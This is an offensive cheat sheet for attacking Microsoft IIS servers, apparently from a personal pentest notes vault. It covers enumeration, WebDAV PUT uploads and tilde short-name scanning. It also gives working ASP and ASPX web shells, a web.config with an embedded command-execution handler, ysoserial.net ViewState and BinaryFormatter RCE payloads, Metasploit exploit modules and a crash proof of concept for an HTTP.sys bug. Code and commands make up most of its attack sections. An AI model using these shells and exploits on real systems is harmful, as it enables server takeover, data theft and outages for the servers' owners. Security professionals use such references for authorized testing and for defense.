# IIS

#IIS #InternetInformationServices #Microsoft #webservices #Windows

## What is IIS?
Microsoft Internet Information Services — Windows web server. Ships with Windows Server. Default web server for ASP.NET applications. Serves classic ASP, ASP.NET, and static content. Attack surface includes WebDAV, HTTP method abuse, short name enumeration, and .NET deserialization.

- Port: **TCP 80** — HTTP
- Port: **TCP 443** — HTTPS
- Default web root: `C:\inetpub\wwwroot\`
- Config: `C:\Windows\System32\inetsrv\config\applicationHost.config`
- Web.config per-app: `C:\inetpub\wwwroot\web.config`

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|nmap]] | Version, methods, `http-webdav-scan`, `iis_internal_ip` recon |
| [[Tools/File Transfer/cURL\|cURL]] | Methods, WebDAV `PUT`, web.config disclosure, shell access |
| [[Tools/Web/whatweb\|whatweb]] | IIS/ASP.NET version fingerprint |
| [[Tools/Scanning/gobuster\|gobuster]] | `.asp`/`.aspx`/`.config` content discovery |
| [[Tools/Web/IIS-ShortName-Scanner\|IIS-ShortName-Scanner]] | Tilde (8.3) short-name enumeration |
| [[Tools/Web/davtest\|davtest]] | Fingerprint what a writable WebDAV root will execute |
| [[Tools/File Transfer/cadaver\|cadaver]] | Interactive WebDAV upload/move |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `iis_webdav_*`, `iis_webdav_scstoragepathfromurl` (CVE-2017-7269) |
| [[Tools/Payloads & Shells/ysoserial.net\|ysoserial.net]] | .NET gadget payloads — ViewState/BinaryFormatter RCE |
| [[Tools/Web/Blacklist3r\|Blacklist3r]] | Recover known/default ASP.NET `machineKey`s for ViewState signing |

---

## Enumeration

```bash
# Nmap
nmap -p 80,443 --script http-title,http-server-header,http-methods,http-webdav-scan -sV <target>

# Fingerprint IIS version
curl -I http://<target>/
whatweb http://<target>

# Check for WebDAV
nmap -p 80 --script http-webdav-scan <target>
curl -X OPTIONS http://<target>/ -v 2>&1 | grep -i "Allow:"

# Short name enumeration (IIS 6.0/7.0/8.0 tilde vulnerability)
# https://github.com/irsdl/IIS-ShortName-Scanner
java -jar iis_shortname_scanner.jar 20 8 http://<target>/

# gobuster — .NET extensions
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x asp,aspx,config,bak,txt

# Metasploit
use auxiliary/scanner/http/iis_internal_ip   # internal IP via OPTIONS
```

---

## Connect / Access

```bash
curl http://<target>/
curl -k https://<target>/

# Test HTTP methods
curl -X OPTIONS http://<target>/ -v
curl -X PUT http://<target>/test.txt -d "test" -v   # WebDAV
curl -X DELETE http://<target>/test.txt -v
```

---

## Attack Vectors

### WebDAV File Upload → Shell

```bash
# Check WebDAV is enabled
nmap -p 80 --script http-webdav-scan <target>
davtest -url http://<target>/    # test what file types can be uploaded

# Upload shell via WebDAV
curl -X PUT http://<target>/shell.asp -d '<%execute(request("cmd"))%>'
curl -X PUT http://<target>/shell.aspx -d '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c whoami"); %>'

# If PUT returns 201: access shell
curl "http://<target>/shell.asp?cmd=whoami"

# cadaver (WebDAV client)
cadaver http://<target>/
dav:> put shell.asp
dav:> ls

# Metasploit
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS <target>
set HttpUsername <user>
set HttpPassword <pass>
run
```

### Short Name Enumeration (Tilde ~1 Trick)

```bash
# IIS 8.0 and earlier leak short (8.3) filenames via 404 vs 400 difference
# e.g., if file is "secretfile.aspx", 8.3 name is "SECRET~1.aspx"
# Attacker can brute enumerate first 6 chars of filenames

# Scanner
java -jar iis_shortname_scanner.jar 20 8 http://<target>/
# Output: reveals partial filenames → guess full names

# Manual check
curl -s -o /dev/null -w "%{http_code}" "http://<target>/s*~1*/a.aspx"
# 404 = prefix doesn't match, 400 = prefix matches (file exists)
```

### ASP/ASPX Web Shell Upload

```bash
# If file upload functionality exists (multipart, FTP, etc.)
# Upload one of:

# Classic ASP shell
echo '<%execute(request("cmd"))%>' > shell.asp

# ASPX shell
cat > shell.aspx << 'EOF'
<%@ Page Language="C#" %>
<% System.Diagnostics.Process p = new System.Diagnostics.Process();
   p.StartInfo.FileName = "cmd.exe";
   p.StartInfo.Arguments = "/c " + Request["cmd"];
   p.StartInfo.UseShellExecute = false;
   p.StartInfo.RedirectStandardOutput = true;
   p.Start();
   Response.Write(p.StandardOutput.ReadToEnd()); %>
EOF

# Access shell
curl "http://<target>/shell.aspx?cmd=whoami"
```

### CVE-2017-7269 — IIS 6.0 WebDAV Buffer Overflow

Affects IIS 6.0 (Windows Server 2003). RCE via PROPFIND request.

```bash
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS <target>
run
```

### CVE-2021-31166 — HTTP Protocol Stack RCE (IIS 10)

BSOD/RCE via malformed Accept-Encoding header. Windows 10 2004/20H2 + Server 2019.

```bash
# PoC causes BSOD — use carefully in authorized testing
curl -H "Accept-Encoding: ,\"" http://<target>/
```

### web.config Disclosure

```bash
# web.config may contain connection strings, credentials
curl http://<target>/web.config
curl http://<target>/../web.config   # directory traversal

# Common locations
curl http://<target>/Web.config
curl http://<target>/ApplicationSettings.config
```

### web.config Upload → RCE

An upload primitive that lands a file in a directory but blocks script extensions can still be abused: a `web.config` is not an "executable" extension, but IIS honours it — and it can carry an ASP-classic handler that runs when the directory is requested.

```xml
<!-- web.config that executes embedded classic ASP on GET of the folder -->
<?xml version="1.0" encoding="UTF-8"?>
<configuration><system.webServer><handlers accessPolicy="Read, Script, Write">
  <add name="web_config" path="*.config" verb="*"
       modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll"
       resourceType="Unspecified" requiredAccess="Write" preCondition="bitness64" />
</handlers><security><requestFiltering><fileExtensions>
  <remove fileExtension=".config" />
</fileExtensions><hiddenSegments><remove segment="web.config" />
</hiddenSegments></requestFiltering></security></system.webServer></configuration>
<%
Set s = CreateObject("WScript.Shell")
Response.Write(s.Exec("cmd /c " & Request.QueryString("cmd")).StdOut.ReadAll())
%>
```

```bash
# Upload web.config to a writable dir, then trigger it
curl "http://<target>/uploads/web.config?cmd=whoami"
```

### ASP.NET ViewState Deserialization → RCE (machineKey)

If you know the app's `machineKey` (validation/decryption keys), you can forge a signed `__VIEWSTATE` that deserializes into a gadget chain → RCE as the app-pool identity. Keys come from a **web.config disclosure** (see above / path traversal), a **known/default key** (Blacklist3r scans a library of leaked keys), or a public sample-app key.

```bash
# 1. Find/confirm the machineKey — Blacklist3r checks the ViewState MAC against known keys
AspDotNetWrapper.exe --keypath machinekeys.txt --encrypteddata <__VIEWSTATE value> \
  --purpose=viewstate --valalgo=sha1 --decalgo=aes

# 2. Generate a ViewState RCE payload with the recovered keys (ysoserial.net)
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "powershell -e <b64>" \
  --generator=<__VIEWSTATEGENERATOR> \
  --validationalg=SHA1 --validationkey=<VALIDATION_KEY> \
  --decryptionalg=AES --decryptionkey=<DECRYPTION_KEY>

# 3. POST the forged __VIEWSTATE (drop __VIEWSTATEENCRYPTED or you'll get a MAC error)
curl -s "http://<target>/page.aspx" --data-urlencode "__VIEWSTATE=<payload>" \
  --data "__VIEWSTATEGENERATOR=<gen>"
```

> [!note] No `__VIEWSTATEGENERATOR` and `viewStateEncryptionMode="Always"`? You need the decryption key too, not just validation — Blacklist3r/ysoserial.net handle both once the keys are known. Gadgets that work broadly: `TextFormattingRunProperties`, `TypeConfuseDelegate`.

### Raw BinaryFormatter Deserialization

```bash
# For non-ViewState sinks (custom deserialized cookies/params using BinaryFormatter)
ysoserial.exe -g WindowsIdentity -f BinaryFormatter \
  -c "whoami > C:\inetpub\wwwroot\out.txt" -o base64
# Submit in the vulnerable cookie/parameter
```

### CVE-2015-1635 (MS15-034) — HTTP.sys Range RCE / DoS

IIS on unpatched Windows 7/8/2008R2/2012 — a crafted `Range` header triggers an HTTP.sys integer overflow (memory disclosure or BSOD; RCE theoretically).

```bash
# Detection — vulnerable host returns 416 "Requested Range Not Satisfiable"
curl -s -o /dev/null -w "%{http_code}\n" http://<target>/ \
  -H "Host: <target>" -H "Range: bytes=0-18446744073709551615"
# 416 = vulnerable, 400 = patched
nmap -p 80 --script http-vuln-cve2015-1635 <target>
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| WebDAV enabled | File upload → RCE |
| PUT/DELETE methods allowed | Direct file write/delete |
| Old IIS version (< 10) | Multiple CVEs |
| Short name disclosure (tilde) | Filename enumeration |
| web.config accessible | Connection strings, credentials, **machineKey → ViewState RCE** |
| Default/known/leaked `machineKey` | Forged `__VIEWSTATE` → deserialization RCE |
| Writable dir accepting `web.config` | Config-upload → ASP RCE despite extension filter |
| Unpatched HTTP.sys (pre-MS15-034) | Range-header memory disclosure / BSOD |
| Directory browsing enabled | File listing |
| ASP execution in upload dirs | Uploaded shell execution |

---

## Quick Reference

| Goal | Command |
|---|---|
| Fingerprint | `curl -I http://host` / `whatweb http://host` |
| Check WebDAV | `nmap -p 80 --script http-webdav-scan host` |
| Test methods | `curl -X OPTIONS http://host/ -v` |
| WebDAV shell upload | `curl -X PUT http://host/shell.asp -d '<%execute(request("cmd"))%>'` |
| davtest | `davtest -url http://host/` |
| Short name scan | `java -jar iis_shortname_scanner.jar 20 8 http://host/` |
| Dir brute | `gobuster dir -u http://host -w wordlist.txt -x asp,aspx` |
| MSF WebDAV | `exploit/windows/iis/iis_webdav_upload_asp` |
| web.config upload RCE | upload `web.config` (ASP handler) → `GET /uploads/web.config?cmd=whoami` |
| ViewState RCE | `ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd" --validationkey=... --decryptionkey=...` |
| Find machineKey | `AspDotNetWrapper.exe --keypath keys.txt --encrypteddata <VIEWSTATE> --purpose=viewstate` |
| MS15-034 check | `nmap -p80 --script http-vuln-cve2015-1635 host` |

---

*Created: 2026-07-13*
*Updated: 2026-09-24*
*Model: claude-opus-4-8*
